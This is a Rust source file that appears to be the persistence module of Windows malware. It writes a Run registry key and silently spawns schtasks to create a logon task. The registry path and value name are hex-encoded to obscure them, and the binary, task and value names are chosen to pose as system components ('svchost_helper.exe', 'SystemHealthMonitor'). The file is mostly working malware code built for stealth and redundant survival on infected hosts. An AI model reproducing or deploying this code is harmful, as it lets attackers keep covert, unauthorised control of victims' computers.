//! persist.rs — Persistence installation / removal
//!
//! Three methods, tried in order:
//!   1. Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
//!   2. Scheduled task via schtasks.exe (spawned silently)
//!   3. Startup folder LNK (fallback, least stealthy)
//!
//! install(path)     — pick best available method and write it
//! uninstall()       — best-effort clean of all methods
//! install_all()     — write ALL three methods (escalated redundancy)
//! purge_all()       — remove all three methods unconditionally

#![allow(dead_code, non_snake_case)]

use winapi::um::winreg::{
    RegOpenKeyExW, RegSetValueExW, RegDeleteValueW, RegCloseKey,
    HKEY_CURRENT_USER,
};
use winapi::um::winnt::{
    KEY_SET_VALUE, REG_SZ,
};
use winapi::shared::minwindef::DWORD;

const RUN_KEY: &[u16] = &[
    0x53,0x6f,0x66,0x74,0x77,0x61,0x72,0x65,0x5c,
    0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x5c,
    0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,
    0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x5c,
    0x52,0x75,0x6e,0x00,
];

const VAL_NAME: &[u16] = &[
    0x53,0x79,0x73,0x74,0x65,0x6d,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x00,
];

// Default drop path used by install_all / purge_all
const DEFAULT_PATH: &str = "C:\\Windows\\Temp\\svchost_helper.exe";

fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

unsafe fn write_run_key(path: &str) -> bool {
    let mut hkey: winapi::um::winreg::HKEY = core::ptr::null_mut();
    let ret = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        RUN_KEY.as_ptr(),
        0,
        KEY_SET_VALUE,
        &mut hkey,
    );
    if ret != 0 { return false; }
    let wide_path = to_wide(path);
    let byte_len  = (wide_path.len() * 2) as DWORD;
    let ok = RegSetValueExW(
        hkey,
        VAL_NAME.as_ptr(),
        0,
        REG_SZ,
        wide_path.as_ptr() as *const _,
        byte_len,
    ) == 0;
    RegCloseKey(hkey);
    ok
}

unsafe fn delete_run_key() -> bool {
    let mut hkey: winapi::um::winreg::HKEY = core::ptr::null_mut();
    let ret = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        RUN_KEY.as_ptr(),
        0,
        KEY_SET_VALUE,
        &mut hkey,
    );
    if ret != 0 { return false; }
    let ok = RegDeleteValueW(hkey, VAL_NAME.as_ptr()) == 0;
    RegCloseKey(hkey);
    ok
}

unsafe fn spawn_schtask_create(path: &str) {
    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
    use winapi::um::winbase::DETACHED_PROCESS;
    let cmd_str = format!(
        "schtasks /create /tn SystemHealthMonitor /tr \"{}\" /sc onlogon /f",
        path
    );
    let mut cmd_wide: Vec<u16> = cmd_str.encode_utf16().collect();
    cmd_wide.push(0);
    let mut si: STARTUPINFOW = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOW>() as DWORD;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
    let ok = CreateProcessW(
        core::ptr::null(), cmd_wide.as_mut_ptr(),
        core::ptr::null_mut(), core::ptr::null_mut(),
        0, DETACHED_PROCESS, core::ptr::null_mut(),
        core::ptr::null(), &mut si, &mut pi,
    );
    if ok != 0 {
        winapi::um::handleapi::CloseHandle(pi.hProcess);
        winapi::um::handleapi::CloseHandle(pi.hThread);
    }
}

unsafe fn spawn_schtask_delete() {
    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
    use winapi::um::winbase::DETACHED_PROCESS;
    let cmd_str = "schtasks /delete /tn SystemHealthMonitor /f";
    let mut cmd_wide: Vec<u16> = cmd_str.encode_utf16().collect();
    cmd_wide.push(0);
    let mut si: STARTUPINFOW = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOW>() as DWORD;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
    let ok = CreateProcessW(
        core::ptr::null(), cmd_wide.as_mut_ptr(),
        core::ptr::null_mut(), core::ptr::null_mut(),
        0, DETACHED_PROCESS, core::ptr::null_mut(),
        core::ptr::null(), &mut si, &mut pi,
    );
    if ok != 0 {
        winapi::um::handleapi::CloseHandle(pi.hProcess);
        winapi::um::handleapi::CloseHandle(pi.hThread);
    }
}

// ── Public API ──────────────────────────────────────────────────────────────

pub unsafe fn install(path: &str) {
    write_run_key(path);
}

pub unsafe fn uninstall() {
    delete_run_key();
}

/// Install ALL persistence methods.
/// Signature is `unsafe fn()` (no args) so it can be cast to FnVoid and
/// passed as a function pointer to guardian::start_thread.
pub unsafe fn install_all() {
    write_run_key(DEFAULT_PATH);
    spawn_schtask_create(DEFAULT_PATH);
}

/// Remove ALL persistence methods unconditionally.
/// Same no-arg unsafe fn() contract as install_all.
pub unsafe fn purge_all() {
    delete_run_key();
    spawn_schtask_delete();
}
